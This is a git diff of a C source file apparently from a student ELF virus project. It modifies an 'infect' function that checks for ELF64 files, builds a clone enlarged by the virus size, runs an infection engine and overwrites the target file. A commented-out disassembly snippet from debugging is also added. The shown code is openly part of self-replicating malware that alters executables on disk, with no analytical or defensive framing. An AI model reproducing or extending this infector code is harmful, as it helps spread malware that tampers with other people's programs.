@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/04 03:37:20 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/12/27 01:44:00 by anselme          ###   ########.fr       */
+/*   Updated: 2021/06/15 16:22:42 by ichkamo          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -45,28 +45,34 @@ static bool	is_elf64(const char *file)
 	return true;
 }
 
-inline bool	infect(const char *file)
+inline bool	infect(struct virus_header *vhdr, const char *file)
 {
-	struct safe_ptr	original_ref = {.ptr = NULL};
-	struct safe_ptr	clone_ref = {.ptr = NULL};
+	struct safe_ptr	original_ref = {.ptr = NULL, .size = 0};
+	struct safe_ptr	clone_ref    = {.ptr = NULL, .size = 0};
 
 	log_try_infecting(file);
 
 	if (!is_elf64(file)
 	|| !init_original_safe(&original_ref, file)
-	|| !init_clone_safe(&clone_ref, original_ref.size)
-	|| !infection_engine(clone_ref, original_ref)
+	|| !init_clone_safe(&clone_ref, original_ref.size, vhdr->virus_size)
+	|| !infection_engine(vhdr, clone_ref, original_ref)
 	|| !write_file(clone_ref, file))
 	{
 		free_accessor(&original_ref);
 		free_accessor(&clone_ref);
 		return errors(ERR_THROW, _ERR_INFECT);
 	}
-
 	free_accessor(&original_ref);
 	free_accessor(&clone_ref);
 
 	log_success();
-
 	return true;
 }
+
+/*
+0x4299ed:	mov    rax,QWORD PTR [rbp-0x28]
+=> 0x4299f1:	mov    cl,BYTE PTR [rax]
+0x4299f3:	mov    rax,QWORD PTR [rbp-0x20]
+0x4299f7:	mov    BYTE PTR [rax],cl
+0x4299f9:	mov    rax,QWORD PTR [rbp-0x20]
+*/
